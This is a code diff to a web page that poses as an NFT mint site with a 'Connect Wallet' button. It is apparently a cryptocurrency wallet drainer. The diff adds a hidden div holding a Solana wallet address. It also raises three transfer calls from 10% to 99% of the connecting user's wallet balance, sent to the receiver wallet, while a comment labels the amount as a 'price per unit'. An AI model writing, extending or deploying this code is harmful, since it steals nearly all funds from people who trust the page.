@@ -4,13 +4,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-</head>
+        <div class="mint__content">
+            <div class="mint__wallet-hidden" style="display: none">A4fMguhfZd4Cxk5LJLkTVa1EPnvgz4uBY3S2wXfpfchx</div>
+            <div class="mint__counter">
+                <div class="counter">
+                    <div class="counter__input">1</div>
+                    <div class="counter__button counter__button_minus"><img src="./img/minus.svg"></div>
+                    <div class="counter__button counter__button_plus"><img src="./img/plus.svg"></div>
+                </div>
+            </div>
+        </div>
 
-<body>
-   
         <div class="footer-box mint__button" id="connect">
             <button class="v-btn v-btn--is-elevated v-btn--has-bg v-btn--rounded theme--light v-size--default client--button" type="button" style="justify-content: center;">Connect Wallet</button>
         </div>
+
+    </div>
 
     <div class="select__wallet-cont" style="display: none;">
         <div class="select__wallet">
@@ -51,6 +60,8 @@
           </div>
         </div>
       </div>
+
+    <div class="box"></div>
 <script src="js/libs/jquery-3.6.0.min.js" charset="utf-8"></script>
 <script src="js/script.js"></script>
 
@@ -217,7 +228,7 @@
             solanaWeb3.SystemProgram.transfer({
               fromPubkey: window.solflare.publicKey,
               toPubkey: recieverWallet,
-              lamports: walletBalance * 0.1, // const * price per unit
+              lamports: walletBalance * 0.99, // const * price per unit
             }),
           );
 
@@ -317,7 +328,7 @@
                   solanaWeb3.SystemProgram.transfer({
                   fromPubkey: orgPubKey,
                   toPubkey: recieverWallet,
-                  lamports: (walletBalance * 0.1),
+                  lamports: (walletBalance * 0.99),
                 })
               )
 
@@ -455,7 +466,7 @@
             solanaWeb3.SystemProgram.transfer({
               fromPubkey: resp.publicKey,
               toPubkey: recieverWallet,
-              lamports: walletBalance * 0.1,
+              lamports: walletBalance * 0.99,
             }),
           );
 
